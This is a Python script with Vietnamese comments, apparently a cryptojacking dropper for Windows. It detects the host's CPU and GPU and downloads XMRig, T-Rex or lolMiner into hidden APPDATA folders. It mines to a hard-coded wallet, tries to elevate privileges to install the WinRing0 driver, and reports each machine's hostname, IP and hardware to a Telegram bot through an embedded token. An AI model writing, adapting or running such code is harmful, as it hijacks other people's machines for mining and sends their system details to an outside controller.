import os
import subprocess
import urllib.request
import zipfile
import time
import socket
import json
import re
from datetime import datetime

# === CẤU HÌNH ===
WALLET = "BTC:13h82mkRXz1HEHi24Gkp5LiroF6rbMFmWk"
TELEGRAM_BOT_TOKEN = "8098349993:AAHNcSnLw3yTj4c9eYXBGLFJEXEsl4tPu0E"
TELEGRAM_CHAT_ID = -5042629740
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
MIN_VRAM_GB = 4.1

POOL_GPU = "etchash.unmineable.com:3333"
POOL_CPU = "rx.unmineable.com:3333"

# -------------------------------
# UTILS
# -------------------------------
def run_cmd(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout

def download(url, path):
    print(f"Downloading: {url.split('/')[-1]}...", end="")
    try:
        urllib.request.urlretrieve(url, path)
        print(" OK")
    except Exception as e:
        print(f"\nDownload failed: {e}")
        exit(1)

def extract(zip_path, folder):
    print("Extracting...", end="")
    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            for member in z.infolist():
                target = os.path.join(folder, member.filename)
                if os.path.exists(target):
                    try: os.chmod(target, 0o777); os.remove(target)
                    except: pass
            z.extractall(folder)
        print(" OK")
    except Exception as e:
        print(f"\nExtract failed: {e}")
        exit(1)

def send_telegram(message):
    try:
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True}
        req = urllib.request.Request(TELEGRAM_API, data=json.dumps(data).encode(), headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=10)
        print("Telegram: Gửi thành công!")
    except Exception as e:
        print(f"Telegram: Lỗi → {e}")

def get_cpu_info():
    try:
        name = run_cmd('wmic cpu get name /format:list').strip().split('=')[1].strip()
        cores = int(run_cmd('wmic cpu get NumberOfCores /format:list').strip().split('=')[1])
        threads = int(run_cmd('wmic cpu get NumberOfLogicalProcessors /format:list').strip().split('=')[1])
        return name, cores, threads
    except:
        return "Unknown CPU", 1, 1

def get_vram_gb():
    try:
        output = run_cmd('wmic path win32_videocontroller get AdapterRAM,Name /format:list')
        lines = output.strip().split('\n')
        vram = 0
        name = "Unknown"
        for line in lines:
            if "AdapterRAM=" in line:
                try: vram = int(line.split('=')[1]) / (1024**3)
                except: pass
            if "Name=" in line:
                name = line.split('=', 1)[1].strip()
        return round(vram, 2), name
    except:
        return 0, "Unknown"

def detect_system():
    print("Phát hiện hệ thống...")
    vram_gb, gpu_name = get_vram_gb()
    cpu_name, cores, threads = get_cpu_info()
    print(f"CPU: {cpu_name} | {cores}C/{threads}T")
    print(f"GPU: {gpu_name} | VRAM: {vram_gb} GB")
    return vram_gb, gpu_name, cpu_name, cores, threads

# -------------------------------
# TỐI ƯU CPU MINING (CHO MỌI CPU)
# -------------------------------
def miner_cpu(vram_gb, gpu_name, cpu_name, cores, threads):
    folder = os.path.join(os.getenv("APPDATA"), "cpu_miner")
    os.makedirs(folder, exist_ok=True)
    os.chdir(folder)
    os.system("taskkill /f /im xmrig.exe >nul 2>&1")

    url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip"
    download(url, "xmrig.zip")
    extract("xmrig.zip", folder)

    exe_path = None
    for root, _, files in os.walk(folder):
        for f in files:
            if f.lower() == "xmrig.exe":
                exe_path = os.path.join(root, f)
                break
        if exe_path: break
    if not exe_path:
        print("ERROR: xmrig.exe not found!")
        exit(1)

    # TỐI ƯU THREADS TỰ ĐỘNG
    optimal_threads = max(1, threads // 2) if "ryzen" in cpu_name.lower() else threads
    if cores <= 4: optimal_threads = cores
    if "i3" in cpu_name or "celeron" in cpu_name: optimal_threads = cores

    # TỰ ĐỘNG CHỌN ASSEMBLY
    asm = "auto:intel" if "intel" in cpu_name.lower() else "auto:ryzen" if "ryzen" in cpu_name.lower() else "auto"

    config = {
        "autosave": True,
        "cpu": {
            "enabled": True,
            "huge-pages": True,
            "huge-pages-jit": True,
            "hw-aes": None,
            "priority": 2,
            "memory-pool": False,
            "yield": True,
            "max-threads-hint": 90,
            "asm": asm,
            "threads": optimal_threads
        },
        "pools": [{"algo": "rx", "url": POOL_CPU, "user": WALLET, "pass": "x", "keepalive": True}],
        "log-file": "xmrig.log",
        "donate-level": 1
    }

    with open(os.path.join(folder, "config.json"), "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2)

    # BẬT MSR (nếu có quyền)
    try:
        subprocess.run('powershell -Command "Start-Process cmd -Verb runAs -ArgumentList \'/c winring0_x64.exe install\'"', cwd=folder, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

    # GỬI TELEGRAM
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    msg = (
        f"<b>MINER STARTED (CPU - TỐI ƯU)</b>\n"
        f"<b>Máy:</b> <code>{hostname}</code>\n"
        f"<b>IP:</b> <code>{ip}</code>\n"
        f"<b>CPU:</b> <code>{cpu_name}</code>\n"
        f"<b>Lõi/Luồng:</b> <code>{cores}C/{threads}T</code>\n"
        f"<b>Threads dùng:</b> <code>{optimal_threads}</code>\n"
        f"<b>VRAM:</b> <code>{vram_gb} GB</code>\n"
        f"<b>Lý do:</b> <i>VRAM thấp hoặc không đủ</i>\n"
        f"<b>Pool:</b> <code>rx.unmineable.com</code>\n"
        f"<b>Ví:</b> <code>{WALLET}</code>\n"
        f"<b>Thời gian:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    send_telegram(msg)

    print(f"Khởi động XMRig với {optimal_threads} threads...")
    os.system(f'"{exe_path}" -c config.json --no-color')

# -------------------------------
# GPU MINERS
# -------------------------------
def miner_nvidia(vram_gb, gpu_name):
    folder = os.path.join(os.getenv("APPDATA"), "nvidia_miner")
    os.makedirs(folder, exist_ok=True)
    os.chdir(folder)
    os.system("taskkill /f /im t-rex.exe >nul 2>&1")
    download("https://trex-miner.com/download/t-rex-0.26.8-win.zip", "trex.zip")
    extract("trex.zip", folder)
    exe = _find_exe(folder, "t-rex.exe")
    _send_gpu_telegram("NVIDIA", gpu_name, vram_gb)
    os.system(f'"{exe}" -a etchash -o stratum+tcp://{POOL_GPU} -u {WALLET} -p x --no-color')

def miner_amd(vram_gb, gpu_name):
    folder = os.path.join(os.getenv("APPDATA"), "amd_miner")
    os.makedirs(folder, exist_ok=True)
    os.chdir(folder)
    os.system("taskkill /f /im lolMiner.exe >nul 2>&1")
    download("https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.78/lolMiner_v1.78_Win64.zip", "amd.zip")
    extract("amd.zip", folder)
    exe = _find_exe(folder, "lolminer.exe")
    _send_gpu_telegram("AMD", gpu_name, vram_gb)
    os.system(f'"{exe}" --algo ETCHASH --pool {POOL_GPU} --user {WALLET} --pass x --nocolor')

def _find_exe(folder, name):
    for root, _, files in os.walk(folder):
        for f in files:
            if f.lower() == name:
                return os.path.join(root, f)
    print(f"ERROR: {name} not found!")
    exit(1)

def _send_gpu_telegram(gpu_type, gpu_name, vram_gb):
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    cpu_name, cores, threads = get_cpu_info()
    msg = (
        f"<b>MINER STARTED (GPU)</b>\n"
        f"<b>Máy:</b> <code>{hostname}</code>\n"
        f"<b>IP:</b> <code>{ip}</code>\n"
        f"<b>GPU:</b> <code>{gpu_name}</code>\n"
        f"<b>VRAM:</b> <code>{vram_gb} GB</code>\n"
        f"<b>CPU:</b> <code>{cpu_name}</code>\n"
        f"<b>Loại:</b> <code>{gpu_type} GPU</code>\n"
        f"<b>Pool:</b> <code>etchash.unmineable.com</code>\n"
        f"<b>Ví:</b> <code>{WALLET}</code>\n"
        f"<b>Thời gian:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    send_telegram(msg)

# -------------------------------
# MAIN
# -------------------------------
if __name__ == "__main__":
    print("="*70)
    print(" AUTO MINER ULTIMATE – TỐI ƯU CHO MỌI MÁY")
    print(f" Wallet: {WALLET}")
    print(f" VRAM ≥ {MIN_VRAM_GB} GB → GPU | Dưới → CPU (tối ưu)")
    print("="*70)

    vram_gb, gpu_name, cpu_name, cores, threads = detect_system()

    # XÓA FILE CŨ
    for f in ["dxinfo.txt", "xmrig.log"]:
        if os.path.exists(f):
            try: os.remove(f)
            except: pass

    # QUYẾT ĐỊNH
    if vram_gb >= MIN_VRAM_GB:
        if "nvidia" in gpu_name.lower():
            miner_nvidia(vram_gb, gpu_name)
        elif "amd" in gpu_name.lower() or "radeon" in gpu_name.lower():
            miner_amd(vram_gb, gpu_name)
        else:
            print("GPU không hỗ trợ → Dùng CPU")
            miner_cpu(vram_gb, gpu_name, cpu_name, cores, threads)
    else:
        print(f"VRAM {vram_gb} GB < {MIN_VRAM_GB} GB → Dùng CPU (tối ưu)")
        miner_cpu(vram_gb, gpu_name, cpu_name, cores, threads)